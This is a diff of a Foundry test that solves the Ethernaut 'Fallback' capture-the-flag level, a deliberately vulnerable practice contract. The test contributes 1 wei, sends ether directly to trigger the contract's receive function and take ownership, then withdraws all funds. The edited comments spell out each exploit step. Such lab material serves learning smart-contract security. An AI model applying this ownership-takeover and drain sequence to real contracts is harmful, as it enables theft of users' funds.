@@ -38,14 +38,16 @@ contract TestFallback is BaseTest {
 
         vm.startPrank(player);
 
-        // send the minimum amount to become a contributor
-        level.contribute{value: 0.0001 ether}();
+        level.contribute{value: 1 wei}();
 
-        // send directly to the contract 1 wei, this will allow us to become the new owner
-        (bool sent, ) = address(level).call{value: 1}("");
-        require(sent, "Failed to send Ether to the level");
+        // Receive fn of Fallback contract won't be able to receive ether unless we have a contribution of atleast 1 wei
+        // Therefore, first contributing 1 wei (can only send less than 0.001 eth via contribute fn)
+        // Once we have greater than 0 contribution then we can invoke receive fn of Fallback contract by
+        // sending any amount of ether directly to the Fallback contract, which will make us
+        // the owner of the contract and then we can call withdraw fn to drain all the funds
+        (bool success, ) = address(level).call{value: 1 wei}("");
+        require(success, "Transfer Failed");
 
-        // now that we are the owner of the contract withdraw all the funds
         level.withdraw();
 
         vm.stopPrank();
